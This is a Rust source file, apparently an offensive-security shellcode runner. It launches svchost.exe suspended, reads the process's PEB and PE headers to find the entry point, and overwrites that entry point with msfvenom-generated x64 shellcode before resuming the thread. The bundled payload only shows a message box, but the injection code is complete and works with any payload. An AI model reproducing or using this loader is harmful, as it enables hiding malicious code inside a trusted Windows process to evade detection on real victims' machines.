use std::{ffi::c_void};
use libloading::{Library, Symbol};
use std::ptr::{null, null_mut};


const FALSE: i32 = 0;

struct StartupInfo {
    cb: u32,
    lp_reserved: *const u16,
    lp_desktop: *const u16,
    lp_title: *const u16,
    dw_x: u32,
    dw_y: u32,
    dw_x_size: u32,
    dw_y_size: u32,
    dw_x_count_chars: u32,
    dw_y_count_chars: u32,
    dw_fill_attribute: u32,
    dw_flags: u32,
    w_show_window: u16,
    cb_reserved2: u16,
    lp_reserved2: *const u8,
    h_std_input: isize,
    h_std_output: isize,
    h_std_error: isize
}

struct ProcessInformation {
    h_process: isize,
    h_thread: isize,
    dw_process_id: u32,
    dw_thread_id: u32
}

#[repr(C)]
#[derive(Debug)]
struct ProcessBasicInformation {
    exit_status: *const c_void,
    peb_base_address: u64,
    affinity_mask: *const c_void,
    base_priority: *const c_void,
    unique_process_id: *const c_void,
    inherited_from_unique_process_id: *const c_void
}

struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

struct WindowsAPI {
    kernel32: Library,
    ntdll: Library
}

impl WindowsAPI {
    unsafe fn new() -> WindowsAPI {
        WindowsAPI {
            kernel32: Library::new("kernel32.dll").unwrap(),
            ntdll: Library::new("ntdll.dll").unwrap()
        }
    }

    unsafe fn load_kernel32_func<T>(&self, func_name: &[u8]) -> Symbol<T> {
        self.kernel32.get(func_name).unwrap()
    }

    unsafe fn load_ntdll_func<T>(&self, func_name: &[u8]) -> Symbol<T> {
        self.ntdll.get(func_name).unwrap()
    }

    unsafe fn create_process(&self, name: *const u16, path: *const u16, cmd_line: *const u16, attr: *const c_void, inherit_handle: bool, creation_flags: u32, env: *const c_void, current_dir: *const u16, startup_info: *const StartupInfo, process_info: *const ProcessInformation) -> i32 {
        let func: Symbol<unsafe extern "system" fn(*const u16, *const u16, *const u16, *const c_void, bool, u32, *const c_void, *const u16, *const StartupInfo, *const ProcessInformation) -> i32> = self.kernel32.get(b"CreateProcessW").unwrap();
        func(name, path, cmd_line, attr, inherit_handle, creation_flags, env, current_dir, startup_info, process_info)
    }

    unsafe fn read_process_memory(&self, handle: isize, addr: *const c_void, buffer: *mut c_void, size: usize, bytes_read: *mut usize) -> i32 {
        let func: Symbol<unsafe extern "system" fn(isize, *const c_void, *mut c_void, usize, *mut usize) -> i32> = self.load_kernel32_func(b"ReadProcessMemory");
        func(handle, addr, buffer, size, bytes_read)
    }

    unsafe fn write_process_memory(&self, handle: isize, addr: *const c_void, buffer: *const c_void, size: usize, bytes_written: *mut usize) -> i32 {
        let func: Symbol<unsafe extern "system" fn(isize, *const c_void, *const c_void, usize, *mut usize) -> i32> = self.load_kernel32_func(b"WriteProcessMemory");
        func(handle, addr, buffer, size, bytes_written)
    }

    unsafe fn resume_thread(&self, handle: isize) -> u64 {
        let func: Symbol<unsafe extern "system" fn(isize) -> u64> = self.load_kernel32_func(b"ResumeThread");
        func(handle)
    }

    unsafe fn zw_query_information_process(&self, handle: isize, process_information_class: u64, process_information: *mut ProcessBasicInformation, process_information_length: u64, return_length: *mut u64) -> i32 {
        let func: Symbol<unsafe extern "system" fn(isize, u64, *mut ProcessBasicInformation, u64, *mut u64) -> i32> = self.load_ntdll_func(b"ZwQueryInformationProcess");
        func(handle, process_information_class, process_information, process_information_length, return_length)
    }

    
    unsafe fn get_last_error(&self) -> u64 {
        let func: Symbol<unsafe extern "C" fn() -> u64> = self.load_kernel32_func(b"GetLastError");
        func()
    }
}

fn main() {
    // msfvenom -p windows/x64/messagebox TEXT="hello world" TITLE="Rust Shellcode Runner" EXIT=THREAD -f rust
    const SHELLCODE: [u8; 328] = [0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,
0x48,0x8d,0x8d,0x30,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,
0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x1a,0x01,
0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,
0x68,0x65,0x6c,0x6c,0x6f,0x20,0x77,0x6f,0x72,0x6c,0x64,0x00,
0x52,0x75,0x73,0x74,0x20,0x53,0x68,0x65,0x6c,0x6c,0x63,0x6f,
0x64,0x65,0x20,0x52,0x75,0x6e,0x6e,0x65,0x72,0x00,0x75,0x73,
0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00];



    const SIZE: usize = SHELLCODE.len();

    let win_api = unsafe { WindowsAPI::new() };

    let mut startup_info = StartupInfo {
        cb: 0,
        lp_reserved: null(),
        lp_desktop: null(),
        lp_title: null(),
        dw_x: 0,
        dw_y: 0,
        dw_x_size: 0,
        dw_y_size: 0,
        dw_x_count_chars: 0,
        dw_y_count_chars: 0,
        dw_fill_attribute: 0,
        dw_flags: 0,
        w_show_window: 0,
        cb_reserved2: 0,
        lp_reserved2: null(),
        h_std_input: 0,
        h_std_output: 0,
        h_std_error: 0
    };

    let mut process_info = ProcessInformation {
        h_process: 0,
        h_thread: 0,
        dw_process_id: 0,
        dw_thread_id: 0
    };

    let path = "C:\\Windows\\System32\\svchost.exe".encode_utf16().collect::<Vec<u16>>();
    let cmd_line = null();
    let attr = null();
    let inherit_handle = false;
    let creation_flags = 0x00000004;
    let env = null();
    let current_dir = null();
    let startup_info_ptr = &mut startup_info as *mut StartupInfo;
    let process_info_ptr = &mut process_info as *mut ProcessInformation;
    let result = unsafe { win_api.create_process(
        null(), 
        path.as_ptr(), 
        cmd_line, 
        attr, 
        inherit_handle, 
        creation_flags, 
        env, 
        current_dir, 
        startup_info_ptr, 
        process_info_ptr
    )};
    if result == FALSE {
        println!("CreateProcessW failed with error code: {}", unsafe { win_api.get_last_error() });
        return;
    } else {
        println!("CreateProcessW succeeded with process id: {}", unsafe { (*process_info_ptr).dw_process_id });
    }

    let handle = unsafe { (*process_info_ptr).h_process };
    if handle == 0 {
        println!("Failed to get handle to process");
        return;
    } else {
        println!("Got handle to process with value: {}", handle);
    }

   let mut process_basic_info = ProcessBasicInformation {
        exit_status: null(),
        peb_base_address: 0,
        affinity_mask: null(),
        base_priority: null(),
        unique_process_id: null(),
        inherited_from_unique_process_id: null()
    };

    let process_basic_info_ptr = &mut process_basic_info as *mut ProcessBasicInformation;
    unsafe { win_api.zw_query_information_process(
        handle, 
        0, 
        process_basic_info_ptr, 
        std::mem::size_of::<ProcessBasicInformation>() as u64, 
        null_mut()
    )};

    println!("Got peb_base: {:?}", unsafe { (*process_basic_info_ptr).peb_base_address as *const c_void});

    let peb_base_address = unsafe { (*process_basic_info_ptr).peb_base_address as *const c_void };

    let module_base_address_offset = 0x10;
    let module_base_address_ptr = peb_base_address as u64 + module_base_address_offset as u64;

    // Read base address from memory
    let mut base_address = [0u8; std::mem::size_of::<u64>()];
    unsafe { 
        win_api.read_process_memory(
            handle,
            module_base_address_ptr as *const c_void,
            base_address.as_mut_ptr() as *mut c_void,
            base_address.len(),
            null_mut()
        )
    };


    // Interpret the read bytes as a 64-bit integer
    let base_address_value = u64::from_le_bytes(base_address);
    println!("Got base address of process with value: 0x{:X}", base_address_value);

    let mut data = [0u8; 0x200];
    let mut bytes_read = 0;
    let result = unsafe { 
        win_api.read_process_memory(
            handle,
            base_address_value as *const c_void,
            data.as_mut_ptr() as *mut _,
            0x200,
            &mut bytes_read
    )};

    if result == FALSE {
        println!("Error reading from process: {}", unsafe { win_api.get_last_error() });
        return;
    } else {
        println!("Read {} bytes from process", bytes_read);
    }


    // print first 20 bytes of data
    for i in 0..20 {
        print!("{:x} ", data[i]);
    }
    println!();


    let e_lfanew_offset = base_address_value + 0x3c; 

    let mut e_lfanew = [0u8; std::mem::size_of::<u32>()];
    unsafe { 
        win_api.read_process_memory(
            handle,
            e_lfanew_offset as *const _,
            e_lfanew.as_mut_ptr() as *mut _,
            e_lfanew.len(),
            null_mut()
    )};

    // Correctly interpret the bytes as u32
    let e_lfanew = u32::from_le_bytes(e_lfanew);
    println!("Got e_lfanew with value: 0x{:x}", e_lfanew);

    // Assuming e_lfanew is already obtained
    let image_file_header_size = 20; // Size of IMAGE_FILE_HEADER
    let optional_header_entrypoint_offset = 0x18; // Offset to AddressOfEntryPoint

    // Calculate the address to read entrypoint_rva
    let entrypoint_rva_address = base_address_value + e_lfanew as u64 + image_file_header_size as u64 + optional_header_entrypoint_offset;

    // Buffer to store the entrypoint_rva value (4 bytes for DWORD)
    let mut entrypoint_rva = [0u8; 4];

    // Read the entrypoint_rva value
    let result = unsafe { 
        win_api.read_process_memory(
            handle,
            entrypoint_rva_address as *const _,
            entrypoint_rva.as_mut_ptr() as *mut _,
            entrypoint_rva.len(),
            null_mut()
        )
    };

    if result == FALSE {
        println!("Error reading from process: {}", unsafe { win_api.get_last_error() });
        return;
    }

    // Correctly interpret the bytes as u32
    let entrypoint_rva = u32::from_le_bytes(entrypoint_rva);

    // Now you have the correct entrypoint_rva value
    println!("Got entrypoint_rva with value: 0x{:X}", entrypoint_rva);
    
    let entrypoint_address = base_address_value + entrypoint_rva as u64;

    println!("Got entrypoint_address with value: 0x{:X}", entrypoint_address);
   
    let mut bytes_written = 0;
    let result = unsafe { win_api.write_process_memory(handle, entrypoint_address as *const c_void, SHELLCODE.as_ptr() as *const c_void, SIZE, &mut bytes_written) };
    if result == FALSE {
        println!("Error writing to process: {}", unsafe { win_api.get_last_error() });
        return;
    } else {
        println!("Wrote {} bytes to process", bytes_written);
    }
    

    // Resume thread
    let result = unsafe { win_api.resume_thread((*process_info_ptr).h_process) };
    if result == 0 {
        println!("ResumeThread failed with error code: {}", unsafe { win_api.get_last_error() });
        return;
    } else {
        unsafe { win_api.resume_thread((*process_info_ptr).h_thread) };
        println!("ResumeThread succeeded");
    }
}
